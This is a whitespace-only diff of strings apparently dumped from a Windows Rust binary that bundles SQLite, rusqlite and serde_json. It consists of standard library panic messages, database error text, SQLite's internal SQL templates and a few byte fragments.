 RefCell already mutably borrowedRefCell already borrowedcalled `Option::unwrap()` on a `None` valuelibrary\core\src\panicking.rs
-index out of bounds: the len is  but the index is 
+index out of bounds: the len is  but the index is
 panic in a function that cannot unwind
 ==assertion `left  right` failed
-  left: 
- right: 
- right` failed: 
-  left: 
+  left:
+ right:
+ right` failed:
+  left:
      {
  { .. }(
 library\core\src\fmt\mod.rs
 library\core\src\slice\memchr.rs
 user-provided comparison function does not correctly implement a total order
 library\core\src\slice\sort\shared\smallsort.rs
-invalid utf-8 sequence of  bytes from index 
-incomplete utf-8 byte sequence from index 
+invalid utf-8 sequence of  bytes from index
+incomplete utf-8 byte sequence from index
 library\core\src\str\pattern.rs
 [...]begin <= end ( <= ) when slicing ``
  is not a char boundary; it is inside  (bytes ) of `
@@ -20400,35 +20400,35 @@ NOZ[
 no7=?BE
 %_ m
 library\core\src\unicode\unicode_data.rs
-range start index  out of range for slice of length 
-range end index 
-slice index starts at  but ends at 
+range start index  out of range for slice of length
+range end index
+slice index starts at  but ends at
 copy_from_slice: source slice length () does not match destination slice length (
 `"|, 0
 _04ac
 jae@m
 , +*0
 jaTOo
-	v' 
-Error code 
+	v'
+Error code
 Successful resultSQL error or missing databaseInternal logic error in SQLiteAccess permission deniedCallback routine requested an abortThe database file is lockedA table in the database is lockedA malloc() failedAttempt to write a readonly databaseOperation terminated by sqlite3_interrupt()Some kind of disk I/O error occurredThe database disk image is malformedUnknown opcode in sqlite3_file_control()Insertion failed because database is fullUnable to open the database fileDatabase lock protocol errorDatabase is emptyThe database schema changedString or BLOB exceeds size limitAbort due to constraint violationData type mismatchLibrary used incorrectlyUses OS features not supported on hostAuthorization deniedAuxiliary database format error2nd parameter to sqlite3_bind out of rangeFile opened that is not a database fileNotifications from sqlite3_log()Warnings from sqlite3_log()sqlite3_step() has another row readysqlite3_step() has finished executingSQLITE_ERROR_MISSING_COLLSEQSQLITE_ERROR_RETRYSQLITE_ERROR_SNAPSHOTError reading from diskUnable to obtain number of requested bytes (file truncated?)Error writing to diskError flushing data to persistent storage (fsync)Error calling fsync on a directoryError attempting to truncate fileError invoking fstat to get file metadataI/O error within xUnlock of a VFS objectI/O error within xLock of a VFS object (trying to obtain a read lock)I/O error within xDelete of a VFS objectSQLITE_IOERR_BLOCKEDOut of memory in I/O layerI/O error within xAccess of a VFS objectI/O error within then xCheckReservedLock methodI/O error in the advisory file locking layerI/O error within the xClose methodSQLITE_IOERR_DIR_CLOSEI/O error within the xShmMap method (trying to open a new shared-memory segment)I/O error within the xShmMap method (trying to resize an existing shared-memory segment)SQLITE_IOERR_SHMLOCKI/O error within the xShmMap method (trying to map a shared-memory segment into process address space)I/O error within the xRead or xWrite (trying to seek within a file)File being deleted does not existI/O error while trying to map or unmap part of the database file into process address spaceVFS is unable to determine a suitable directory for temporary filescygwin_conv_path() system call failedSQLITE_IOERR_VNODESQLITE_IOERR_AUTHSQLITE_IOERR_BEGIN_ATOMICSQLITE_IOERR_COMMIT_ATOMICSQLITE_IOERR_ROLLBACK_ATOMICSQLITE_IOERR_DATASQLITE_IOERR_CORRUPTFSSQLITE_IOERR_IN_PAGELocking conflict due to another connection with a shared cacheSQLITE_LOCKED_VTABAnother process is recovering a WAL mode database fileCannot promote read transaction to write transaction because of writes by another connectionSQLITE_BUSY_TIMEOUTSQLITE_CANTOPEN_NOTEMPDIRAttempted to open directory as fileUnable to convert filename into full pathnameSQLITE_CANTOPEN_SYMLINKContent in the virtual table is corruptSQLITE_CORRUPT_SEQUENCESQLITE_CORRUPT_INDEXWAL mode database file needs recovery (requires write access)Shared-memory file associated with WAL mode database is read-onlyDatabase has hot journal that must be rolled back (requires write access)Database cannot be modified because database file has movedSQLITE_READONLY_CANTINITSQLITE_READONLY_DIRECTORYTransaction was rolled backA CHECK constraint failedCommit hook caused rollbackForeign key constraint failedError returned from extension functionA NOT NULL constraint failedA PRIMARY KEY constraint failedA RAISE function within a trigger firedA UNIQUE constraint failedAn application-defined virtual table error occurredA non-unique rowid occurredSQLITE_CONSTRAINT_PINNEDSQLITE_CONSTRAINT_DATATYPEA WAL mode database file was recoveredHot journal was rolled backAutomatic indexing used - database might benefit from additional indexesSQLITE_AUTH_USERUnknown error code
 /rustc/1159e78c4747b02ef996e55082b704c09b970588\library\std\src\sync\poison\once.rs
 NulErrorextended_codeInternalMalfunctionOperationAbortedDatabaseBusyDatabaseLockedReadOnlyOperationInterruptedSystemIoFailureDatabaseCorruptDiskFullCannotOpenFileLockingProtocolFailedSchemaChangedTooBigConstraintViolationTypeMismatchApiMisuseNoLargeFileSupportAuthorizationForStatementDeniedParameterOutOfRangeNotADatabaseUnknownPoisonErrorSQLite was compiled or configured for single-threaded use only
-Conversion error from type  at index: 
+Conversion error from type  at index:
 Integer  out of range
- out of range at index 
-Invalid parameter name: 
-Invalid path: 
+ out of range at index
+Invalid parameter name:
+Invalid path:
 Execute returned results - did you mean to call query?
 Query returned no rows
-Invalid column index: 
-Invalid column name: 
-Invalid column type , name: 
+Invalid column index:
+Invalid column name:
+Invalid column type , name:
 Query changed  rows
 Query is not read-only
 Multiple statements provided
-Wrong number of parameters passed to query. Got , needed 
- in  at offset 
+Wrong number of parameters passed to query. Got , needed
+ in  at offset
 C:\Users\Grunt\.cargo\registry\src\index.crates.io-1949cf8c6b5b557f\rusqlite-0.31.0\src\inner_connection.rs
 Bug: Somehow interrupt_lock was cleared before the DB was closed
 Could not ensure safe initialization of SQLite.
@@ -20442,7 +20442,7 @@ unexpected negative return from sqlite3_column_bytes
 unexpected SQLITE_BLOB column type with NULL data
 internal error: entered unreachable code: sqlite3_column_type returned invalid value
 Invalid type
-Value 
+Value
 Cannot read  byte value out of  byte blob
 NullIntegerRealTextBlobSqliteFailureSqliteSingleThreadedModeFromSqlConversionFailureIntegralValueOutOfRangeInvalidParameterNameInvalidPathExecuteReturnedResultsQueryReturnedNoRowsInvalidColumnIndexInvalidColumnNameInvalidColumnTypeStatementChangedRowsToSqlConversionFailureInvalidQueryMultipleStatementInvalidParameterCountSqlInputErrormsgoffset/rustc/1159e78c4747b02ef996e55082b704c09b970588\library\core\src\ops\function.rs
 EmptyInvalidDigitPosOverflowNegOverflowZeroParseIntError
@@ -20565,19 +20565,19 @@ assertion failed: idx < CAPACITY/rustc/1159e78c4747b02ef996e55082b704c09b970588\
 assertion failed: edge.height == self.height - 1
 assertion failed: src.len() == dst.len()
 assertion failed: edge.height == self.node.height - 1
-EOF while parsing a listEOF while parsing an objectEOF while parsing a stringEOF while parsing a valueexpected `:`expected `,` or `]`expected `,` or `}`expected identexpected valueexpected `"`invalid escapeinvalid numbernumber out of rangeinvalid unicode code pointcontrol character (\u0000-\u001F) found while parsing a stringkey must be a stringinvalid value: expected key to be a number in quotesfloat key must be finite (got NaN or +/-inf)lone leading surrogate in hex escapetrailing commatrailing charactersunexpected end of hex escaperecursion limit exceededError(, line: , column: 
+EOF while parsing a listEOF while parsing an objectEOF while parsing a stringEOF while parsing a valueexpected `:`expected `,` or `]`expected `,` or `}`expected identexpected valueexpected `"`invalid escapeinvalid numbernumber out of rangeinvalid unicode code pointcontrol character (\u0000-\u001F) found while parsing a stringkey must be a stringinvalid value: expected key to be a number in quotesfloat key must be finite (got NaN or +/-inf)lone leading surrogate in hex escapetrailing commatrailing charactersunexpected end of hex escaperecursion limit exceededError(, line: , column:
 nullfalsetrueC:\Users\Grunt\.cargo\registry\src\index.crates.io-1949cf8c6b5b557f\serde_json-1.0.145\src\ser.rs
 [],{,
 library\std\src\panicking.rs
 (): /rustc/1159e78c4747b02ef996e55082b704c09b970588\library\core\src\str\pattern.rs
 mid > len
-0123456789abcdef 
+0123456789abcdef
 called `Result::unwrap()` on an `Err` value
 internal error: entered unreachable code/rustc/1159e78c4747b02ef996e55082b704c09b970588\library\alloc\src\vec\mod.rs
 assertion failed: self.is_char_boundary(new_len)Utf8Errorvalid_up_toerror_lenNoneSomeTryFromIntError:
 library\std\src\thread\mod.rs
 failed to generate unique thread ID: bitspace exhausted
-RUST_BACKTRACEenvironment variable not foundenvironment variable was not valid unicode: 
+RUST_BACKTRACEenvironment variable not foundenvironment variable was not valid unicode:
 library\std\src\sys_common\wtf8.rs
 library\std\src\ffi\os_str.rs
 WouldBlockfailed to create whole tree
@@ -20587,7 +20587,7 @@ library\std\src\io\buffered\linewritershim.rs
 failed to write whole buffer
 entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot connectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a directorydirectory not emptyread-only filesystem or storage mediumfilesystem loop or indirection limit (e.g. symlink loop)stale network file handleinvalid input parameterinvalid datatimed outwrite zerono storage spaceseek on unseekable filequota exceededfile too largeresource busyexecutable file busydeadlockcross-device link or renametoo many linksinvalid filenameargument list too longoperation interruptedunsupportedunexpected end of fileout of memoryin progressother erroruncategorized errorOscodekindmessageKindErrorCustomerror (os error )
 library\std\src\io\stdio.rs
-failed printing to 
+failed printing to
 stdoutlibrary\std\src\io\mod.rs
 a formatting trait implementation returned an error when the underlying stream did not
 panicked at :
@@ -20606,18 +20606,18 @@ byte index  is out of bounds
 memory allocation of  bytes failed
 note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
 <unnamed>
-thread '' panicked at 
-Box<dyn Any>aborting due to panic at 
+thread '' panicked at
+Box<dyn Any>aborting due to panic at
 thread panicked while processing panic. aborting.
 thread caused non-unwinding panic. aborting.
 library\std\src\..\..\backtrace\src\symbolize\mod.rs
-                   at 
+                   at
 Local\RustBacktraceMutex00000000
 library\std\src\..\..\backtrace\src\dbghelp.rs
 assertion failed: len >= 0
 NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseAddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStaleNetworkFileHandleInvalidInputInvalidDataTimedOutWriteZeroStorageFullNotSeekableQuotaExceededFileTooLargeResourceBusyExecutableFileBusyDeadlockCrossesDevicesTooManyLinksInvalidFilenameArgumentListTooLongInterruptedUnsupportedUnexpectedEofOutOfMemoryInProgressOtherUncategorized
 fatal runtime error: I/O error: operation failed to complete synchronously, aborting
-OS Error  (FormatMessageW() returned error 
+OS Error  (FormatMessageW() returned error
 library\std\src\sys\pal\windows\os.rs
  (FormatMessageW() returned invalid UTF-16)
 library\std\src\sys\pal\windows\mod.rs
@@ -21334,8 +21334,8 @@ subsecond
 local time unavailable
 auto
 localtime
-weekday 
-start of 
+weekday
+start of
 month
 year
 40f-20a-20d
@@ -21422,19 +21422,19 @@ freelist leaf count too big on page %u
 size
 overflow list length
 %s is %u but should be %u
-Tree %u page %u: 
+Tree %u page %u:
 unable to get the page. error code=%d
 btreeInitPage() returns error code %d
 free space corruption
-Tree %u page %u cell %u: 
-Tree %u page %u right child: 
+Tree %u page %u cell %u:
+Tree %u page %u right child:
 Offset %u out of range %u..%u
 Extends off end of page
 Rowid %lld out of order
 Child page depth differs
 Multiple uses for byte %u of page %u
 Fragmentation of %u bytes reported as %u on page %u
-Freelist: 
+Freelist:
 max rootpage (%u) disagrees with header (%u)
 incremental_vacuum enabled with a max rootpage of zero
 Page %u: never used
@@ -21555,7 +21555,7 @@ USING ROWID SEARCH ON TABLE %s FOR IN-OPERATOR
 USING INDEX %s FOR IN-OPERATOR
 sub-select returns %d columns - expected %d
 REUSE LIST SUBQUERY %d
-CORRELATED 
+CORRELATED
 %sLIST SUBQUERY %d
 REUSE SUBQUERY %d
 %sSCALAR SUBQUERY %d
@@ -21568,8 +21568,8 @@ misuse of aggregate: %#T()
 unknown function: %#T()
 RAISE() may only be used within a trigger-program
 table %s may not be altered
-SELECT 1 FROM "%w".sqlite_master WHERE name NOT LIKE 'sqliteX_%%' ESCAPE 'X' AND sql NOT LIKE 'create virtual%%' AND sqlite_rename_test(%Q, sql, type, name, %d, %Q, %d)=NULL 
-SELECT 1 FROM temp.sqlite_master WHERE name NOT LIKE 'sqliteX_%%' ESCAPE 'X' AND sql NOT LIKE 'create virtual%%' AND sqlite_rename_test(%Q, sql, type, name, 1, %Q, %d)=NULL 
+SELECT 1 FROM "%w".sqlite_master WHERE name NOT LIKE 'sqliteX_%%' ESCAPE 'X' AND sql NOT LIKE 'create virtual%%' AND sqlite_rename_test(%Q, sql, type, name, %d, %Q, %d)=NULL
+SELECT 1 FROM temp.sqlite_master WHERE name NOT LIKE 'sqliteX_%%' ESCAPE 'X' AND sql NOT LIKE 'create virtual%%' AND sqlite_rename_test(%Q, sql, type, name, 1, %Q, %d)=NULL
 UPDATE "%w".sqlite_master SET sql = sqlite_rename_quotefix(%Q, sql)WHERE name NOT LIKE 'sqliteX_%%' ESCAPE 'X' AND sql NOT LIKE 'create virtual%%'
 UPDATE temp.sqlite_master SET sql = sqlite_rename_quotefix('temp', sql)WHERE name NOT LIKE 'sqliteX_%%' ESCAPE 'X' AND sql NOT LIKE 'create virtual%%'
 there is already another table or index with this name: %s
@@ -21601,8 +21601,8 @@ no such column: "%T"
 UPDATE "%w".sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, %d) WHERE name NOT LIKE 'sqliteX_%%' ESCAPE 'X'  AND (type != 'index' OR tbl_name = %Q)
 UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view')
 error in %s %s%s%s: %s
-CREATE 
-"%w" 
+CREATE
+"%w"
 %Q%s
 %.*s%s
 PRIMARY KEY
@@ -21614,7 +21614,7 @@ CREATE TABLE %Q.%s(%s)
 DELETE FROM %Q.%s WHERE %s=%Q
 %llu
  %llu
-%llu 
+%llu
 sqlite\_%
 unordered*
 sz=[0-9]*
@@ -21661,7 +21661,7 @@ virtual tables cannot use computed columns
 virtual
 stored
 error in generated column "%s"
-CREATE TABLE 
+CREATE TABLE
 unknown datatype for %s.%s: "%s"
 missing datatype for %s.%s
 AUTOINCREMENT not allowed on WITHOUT ROWID tables
@@ -21776,13 +21776,13 @@ non-%s value in %s.%s
 NUMERIC value in %s.%s
 TEXT value in %s.%s
 CHECK constraint failed in %s
-row 
- missing from index 
-rowid not at end-of-record for row 
- of index 
- values differ from index 
-non-unique entry in index 
-wrong # of entries in index 
+row
+ missing from index
+rowid not at end-of-record for row
+ of index
+ values differ from index
+non-unique entry in index
+wrong # of entries in index
 unsupported encoding: %s
 restart
 ANALYZE "%w"."%w"
@@ -21791,7 +21791,7 @@ CREATE TABLE x
 ("%s"
 ,arg HIDDEN
 ,schema HIDDEN
-PRAGMA 
+PRAGMA
 error in %s %s after %s: %s
 malformed database schema (%s)
 %z - %s
@@ -21810,7 +21810,7 @@ INTERSECT
 EXCEPT
 UNION
 USE TEMP B-TREE FOR %s
-RIGHT PART OF 
+RIGHT PART OF
 USE TEMP B-TREE FOR %sORDER BY
 column%d
 %.*z:%u
@@ -21845,7 +21845,7 @@ too many columns in result set
 DISTINCT aggregates must have exactly one argument
 USE TEMP B-TREE FOR %s(DISTINCT)
 USE TEMP B-TREE FOR %s(ORDER BY)
- USING COVERING INDEX 
+ USING COVERING INDEX
 SCAN %s%s%s
 target object/alias may not appear in FROM clause: %s
 expected %d columns for '%s' but got %d
@@ -21895,7 +21895,7 @@ vtable constructor failed: %s
 vtable constructor did not declare schema: %s
 no such module: %s
 <expr>
- AND 
+ AND
 %s=?
 ANY(%s)
 SEARCH
@@ -21905,7 +21905,7 @@ AUTOMATIC PARTIAL COVERING INDEX
 AUTOMATIC COVERING INDEX
 COVERING INDEX %s
 INDEX %s
- USING 
+ USING
  USING INTEGER PRIMARY KEY (%s
 >? AND %s
 %c?)
@@ -21983,8 +21983,8 @@ no such table column: %s.%s
 SQLITE_
 DROP TABLE IF EXISTS %Q.'%q_segments';DROP TABLE IF EXISTS %Q.'%q_segdir';DROP TABLE IF EXISTS %Q.'%q_docsize';DROP TABLE IF EXISTS %Q.'%q_stat';%s DROP TABLE IF EXISTS %Q.'%q_content';
 __langid
-%Q, 
-%z%Q, 
+%Q,
+%z%Q,
 CREATE TABLE x(%s %Q HIDDEN, docid HIDDEN, %Q HIDDEN)
 CREATE TABLE IF NOT EXISTS %Q.'%q_stat'(id INTEGER PRIMARY KEY, value BLOB);
 docid INTEGER PRIMARY KEY
@@ -22139,7 +22139,7 @@ SAVEPOINT fts3
 RELEASE fts3
 ROLLBACK TO fts3
 unrecognized matchinfo request: %c
-%d %d %d %d 
+%d %d %d %d
 remove_diacritics=1
 remove_diacritics=0
 remove_diacritics=2
@@ -22179,7 +22179,7 @@ CREATE TABLE "%w"."%w_parent"(nodeno INTEGER PRIMARY KEY,parentnode);
 INSERT INTO "%w"."%w_node"VALUES(1,zeroblob(%d))
 INSERT INTO"%w"."%w_rowid"(rowid,nodeno)VALUES(?1,?2)ON CONFLICT(rowid)DO UPDATE SET nodeno=excluded.nodeno
 SELECT * FROM "%w"."%w_rowid" WHERE rowid=?1
-UPDATE "%w"."%w_rowid"SET 
+UPDATE "%w"."%w_rowid"SET
 a%d=?%d
  WHERE rowid=?1
 SELECT length(data) FROM '%q'.'%q_node' WHERE nodeno = 1
@@ -22605,8 +22605,8 @@ IsProcessorFeaturePresent
 InitializeSListHead
 IsDebuggerPresent
 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
-	:	;	<	=	>	A	I	M	N	P	Q	X	b	d	f	p	q	r	y	
-   ( ) * / 0 9 : ; ? A D E F G R S T U _ ` j p q t z } ~ 
+	:	;	<	=	>	A	I	M	N	P	Q	X	b	d	f	p	q	r	y
+   ( ) * / 0 9 : ; ? A D E F G R S T U _ ` j p q t z } ~
 !$!%!&!'!(!)!*!.!/!0!4!5!9!:!<!>!@!E!G!J!K!L!N!O!P!`!
 # #"#)#*#+#|#}#
 $@$`$
@@ -22618,5 +22618,5 @@ $@$`$
 . .!.".#.$.%.&.'.(.).*./.0.:.
 0 0!0*0.000106080;0<0=0>0A0
 2 2*2H2P2Q2`2
-	 	?	
+		?
 oPoQo
